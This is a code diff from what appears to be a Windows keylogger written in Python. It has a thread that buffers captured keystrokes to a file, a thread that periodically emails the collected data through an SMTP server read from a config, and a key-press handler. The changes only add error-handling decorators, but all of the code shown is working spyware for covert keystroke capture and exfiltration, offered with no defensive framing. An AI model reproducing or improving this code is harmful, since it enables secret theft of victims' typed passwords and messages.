@@ -31,11 +31,14 @@ def get_json_config(file):
     return json_data
     
 class Logger(Thread):
+
+    @err_handler
     def __init__(self):
         Thread.__init__(self)
         self.chars = []
         self.mutex = False
-        
+
+    @err_handler 
     def run(self):
         while True:
             sleep(DUMP_TO_FILE_TIME)
@@ -52,6 +55,7 @@ class Logger(Thread):
                 print(get_date(),'a data was dumped to file')
             
 class Sender(Thread):
+    
     @err_handler
     def __init__(self):
         Thread.__init__(self)
@@ -61,7 +65,8 @@ class Sender(Thread):
         self.SMTP = conf['smtp_server']
         self.PORT = conf['server_port']
         self.mutex = False
-        
+
+    @err_handler
     def run(self):
         while True:
             sleep(FILE_TO_SEND_TIME)
@@ -89,7 +94,7 @@ class Sender(Thread):
                     print(get_date(),'a error occured while sendig email')
                     with open('error_log.txt','a') as err_file:
                         err_file.write(get_date() + str(err.args) + '\n')
-
+@err_handler
 def on_press(key):
     try:
         shift = 1 if user32.GetKeyState(0x10)>1 else 0
